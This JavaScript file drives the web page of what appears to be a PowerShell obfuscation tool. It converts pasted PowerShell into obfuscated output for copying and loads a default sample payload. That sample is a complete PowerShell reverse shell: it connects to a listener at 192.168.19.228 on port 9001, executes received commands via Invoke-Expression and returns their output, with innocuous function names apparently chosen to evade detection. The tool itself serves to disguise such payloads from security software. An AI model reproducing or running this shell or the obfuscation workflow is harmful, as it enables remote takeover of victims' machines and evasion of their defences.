const editorOutput = document.querySelector("#editor-output")
const methodSelect = document.querySelector("#method-select")
const editorInput = document.querySelector("#editor-input")
const copyBtn = document.querySelector("#copy-btn")
const tolalSize = document.querySelector("#total-size")

function calculateSizeKB(str) {
    const bytes = new TextEncoder().encode(str).length
    const kilobytes = bytes / 1024
    return kilobytes.toFixed(2)
}

function convertPsCode() {
    try {
        const method = `${methodSelect.value}Method`
        const psCode = editorInput.value
        const output = window.psKovak.run({
            method,
            code: psCode,
            base64: false,
            hideWindow: false
        })

        editorOutput.output = output
        editorOutput.innerHTML = output

        editorOutput.removeAttribute("data-highlighted")
        hljs.highlightElement(editorOutput)
        tolalSize.innerHTML = `${calculateSizeKB(output)} KB`
    } catch (error) {
        console.log(error)
        alert("Something went wrong, please try again")
    }
}

copyBtn.addEventListener("click", async () => {
    try {
        await navigator.clipboard.writeText(editorOutput.output)
    } catch (error) {
        alert("Copy failed, please try again")
    }
})

editorInput.addEventListener("input", () => {
    convertPsCode()
})

methodSelect.addEventListener("change", () => {
    convertPsCode()
})

const samplePayload = `$LHOST = '192.168.19.228';
$PORT = 9001;
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $PORT);
$NetworkStream = $TCPClient.GetStream();
$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
function Daisy($Water){try {Invoke-Expression $Water 2>&1 | Out-String} catch {$_ | Out-String}}
function Rose ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + '> ');$StreamWriter.Flush()}
Rose '';
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Water = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = Daisy($Water);Rose($Output)}
$StreamWriter.Close()`

window.addEventListener("load", () => {
    editorInput.value = samplePayload
    methodSelect.value = "unicode"
    convertPsCode()
})